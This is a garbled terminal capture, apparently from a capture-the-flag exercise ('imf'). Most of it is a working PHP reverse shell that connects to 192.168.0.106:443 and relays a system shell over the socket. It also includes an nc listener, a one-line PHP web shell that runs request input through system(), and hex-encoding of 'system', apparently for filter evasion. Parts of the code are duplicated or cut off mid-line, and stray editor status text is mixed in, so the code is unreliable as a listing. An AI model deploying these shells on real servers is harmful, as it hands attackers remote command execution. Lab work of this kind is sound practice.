

























































































                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell(
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.0.106', 443); 
$sh->run();
unset($sh);
exploits/php_reverse_shell.php [+]                                                                          174,36         97%
               echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: {$status['pid']}\n");
                    do {
                        $status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.0.106', 443);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
                                                                                                                              ┌──(user㉿jakin)-[~/Documents/imf]
└─$ nc -lvnp 443                       
listening on [any] 443 ...
^C
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf]
└─$ cd exploits                       
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ ls
basicreverse.php  php_reverse_shell.php  sqli.py
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ cat basicreverse.php              
<?php system($_REQUEST['248d4b6c97654f61a59b6b6370cfe33b']); ?>
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ ls                                    
basicreverse.php  php_reverse_shell.php  sqli.py
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ nvim basicreverse.php
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ ls
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ ls
basicreverse.php  php_reverse_shell.php  sqli.py
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ cat basicreverse.php 
<?php ($_REQUEST['248d4b6c97654f61a59b6b6370cfe33b']); ?>
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ echo -n 'system' |xxd                                      
00000000: 7379 7374 656d                           system
                                                                                                                              
┌──(user㉿jakin)-[~/Documents/imf/exploits]
└─$ echo -n 'system' |xxd | awk '{print $2,$3,$4}'